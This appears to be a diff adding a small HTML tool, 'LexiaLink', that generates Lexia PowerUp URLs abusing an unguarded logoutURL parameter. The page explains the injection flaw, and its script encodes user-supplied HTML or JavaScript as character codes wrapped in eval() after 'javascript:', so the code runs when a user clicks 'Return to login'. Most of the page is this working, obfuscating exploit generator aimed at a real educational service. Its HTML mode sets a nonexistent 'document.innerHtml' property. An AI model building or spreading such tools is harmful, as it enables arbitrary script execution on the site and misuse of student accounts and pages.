@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LexiaLink</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            margin: 2rem auto;
+            padding: 0 1rem;
+            background-color: #f9f9f9;
+            color: #333;
+            overflow: hidden;
+        }
+
+        textarea {
+            width: 100%;
+            height: 110px;
+            padding: 10px;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            font-size: 1rem;
+            resize: vertical;
+        }
+
+        pre {
+            background-color: #f1f1f1;
+            border: 1px solid #ddd;
+            padding: 15px;
+            max-height: 40px;
+            white-space: pre;
+            font-family: monospace;
+            overflow: scroll;
+        }
+
+        .toggle-container {
+            display: flex;
+            align-items: center;
+            padding-bottom: 12px;
+        }
+
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 26px;
+        }
+
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            border-radius: 34px;
+            transition: 0.3s;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            border-radius: 50%;
+            transition: 0.3s;
+        }
+
+        input:checked+.slider {
+            background-color: #f7df1e;
+        }
+
+        input:not(checked)+.slider {
+            background-color: #E34C26;
+        }
+
+        input:checked+.slider:before {
+            transform: translateX(24px);
+        }
+
+        .toggle-label {
+            padding-left: 12px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #333;
+        }
+    </style>
+</head>
+
+<body>
+
+    <h1>Generate a Lexia PowerUp link</h1>
+
+    <details>
+      <summary>How it works</summary>
+      <p>
+        Basically, when you're on Lexia PowerUp,
+        there's a 'logoutURL' tag that follows you around to bring you back to the sign in page you used to open it,
+        and when you logout (or "Return to login"), it tries to navigate to said page as a normal URL,
+        but the developers forgot to guard against javascript injection, as browsers allow you to use
+        'javascript: ...' in URLs for stuff like bookmarklets or interactable links.
+        When you click "Return to login", the browser runs the custom code you put in here as it should,
+        allowing full replacement or modification of the current page.
+      </p>
+    </details>
+  
+    <h2>Code</h2>
+    <label class="toggle-container">
+        <div class="switch">
+            <input type="checkbox" id="toggleSwitch">
+            <span class="slider"></span>
+        </div>
+        <span class="toggle-label" id="statusText">HTML</span>
+    </label>
+    <textarea id="textInput" placeholder="Type code here..."></textarea>
+  
+    <h2>Lexia Link</h2>
+    <pre id="textOutput"></pre>
+
+    <script>
+        var input = document.getElementById('textInput');
+        var output = document.getElementById('textOutput');
+        var toggleSwitch = document.getElementById('toggleSwitch');
+        var statusText = document.getElementById('statusText');
+        var url = "https://www.lexiapowerup.com/welcome?siteId=1234&logoutURL=javascript:";
+        var js = false;
+
+        function textToCharCodes(text) {
+            const codes = [];
+            for (let i = 0; i < text.length; i++) {
+                codes.push(text.charCodeAt(i));
+            }
+            return codes;
+        }
+
+        function onInput() {
+            var texty = input.value;
+            if (!texty) {
+                output.textContent = "Enter code first...";
+                return;
+            }
+            var code;
+            if (js) {
+                code = texty;
+            } else {
+                code = "document.innerHtml = " + JSON.stringify(texty) + ";"
+            }
+            output.textContent = url + "eval(String.fromCharCode(" + textToCharCodes(code) + "));";
+        }
+
+        function onSwitch() {
+            if (toggleSwitch.checked) {
+                js = true;
+                statusText.textContent = 'JS';
+            } else {
+                js = false;
+                statusText.textContent = 'HTML';
+            }
+            onInput();
+        }
+
+        toggleSwitch.addEventListener('change', onSwitch);
+        input.addEventListener('input', onInput);
+        onInput();
+    </script>
+
+</body>
+
+</html>
